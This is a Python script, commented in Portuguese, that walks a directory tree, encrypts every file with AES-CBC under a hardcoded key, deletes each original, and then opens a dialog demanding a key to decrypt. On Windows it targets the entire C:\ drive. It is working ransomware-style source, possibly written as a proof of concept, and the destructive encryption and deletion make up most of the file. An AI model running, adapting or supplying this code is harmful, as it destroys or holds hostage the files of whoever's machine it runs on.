import os
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import tkinter as tk
from tkinter import simpledialog


def decrypt_file(encrypted_file_path, key):
    """Descriptografa o arquivo criptografado e salva o arquivo original."""
    with open(encrypted_file_path, "rb") as f:
        iv = f.read(16)  # O IV é sempre os primeiros 16 bytes
        encrypted_data = f.read()

    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Descriptografa e remove o padding
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

    # Salva o arquivo descriptografado
    decrypted_file_path = encrypted_file_path.replace(".enc", "")
    with open(decrypted_file_path, "wb") as f:
        f.write(decrypted_data)

    print(f"Arquivo descriptografado: {decrypted_file_path}")
    return decrypted_file_path


def scan_and_decrypt(directory, key):
    """Escaneia o diretório e descriptografa os arquivos criptografados."""
    print(f"Scanning directory: {directory}")
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".enc"):
                file_path = os.path.join(root, file)
                try:
                    print(f"Descriptografando arquivo: {file_path}")
                    decrypt_file(file_path, key)
                except Exception as e:
                    print(f"Error processing {file_path}: {e}")


def encrypt_file(file_path, key):
    """Criptografa o arquivo com a chave fornecida e salva o arquivo criptografado."""
    cipher = AES.new(key, AES.MODE_CBC)

    with open(file_path, "rb") as f:
        data = f.read()

    # Adiciona padding aos dados para que o tamanho seja múltiplo do bloco
    encrypted_data = cipher.encrypt(pad(data, AES.block_size))

    # Salva o arquivo criptografado
    encrypted_file_path = file_path + ".enc"
    with open(encrypted_file_path, "wb") as f:
        # Salva o IV e o arquivo criptografado
        f.write(cipher.iv)
        f.write(encrypted_data)

    print(f"Cryptograf: {encrypted_file_path}")
    os.remove(file_path)
    return encrypted_file_path


def scan_directory(directory, key):
    """Scan a directory and process each file."""
    print(f"Scanning directory: {directory}")
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                encrypt_file(file_path, key)
            except Exception as e:
                print(f"Error processing {file_path}: {e}")


def calculate_hash(file_path):
    """Calculate SHA256 hash of a file."""
    sha256 = hashlib.sha256()
    with open(file_path, "rb") as f:
        while chunk := f.read(8192):
            sha256.update(chunk)
    return sha256.hexdigest()


def ask_for_key():
    """Cria uma janela para pedir a chave ao usuário."""
    root = tk.Tk()
    root.withdraw()  # Esconde a janela principal
    # Pergunta ao usuário pela chave de descriptografia
    key = simpledialog.askstring(
        "Descriptografia", "Digite a chave para descriptografar os arquivos:"
    )
    if key is None:
        print("Chave não fornecida. A operação foi cancelada.")
        return None
    # Converte a chave para um formato que o AES pode usar
    key = hashlib.sha256(key.encode()).digest()  # Gerando uma chave de 256 bits
    return key


if __name__ == "__main__":
    key = hashlib.sha256("umachavequalquer".encode()).digest()

    directory = "./test/" if os.name != "nt" else "C:\\"
    scan_directory(directory, key)

    print(
        "Criptografia concluída. Agora, forneça a chave para descriptografar os arquivos."
    )

    decryption_key = ask_for_key()

    if decryption_key:
        print("Descriptografando arquivos...")
        scan_and_decrypt(directory, decryption_key)
    else:
        print("Nenhuma chave fornecida. Descriptografia não realizada.")
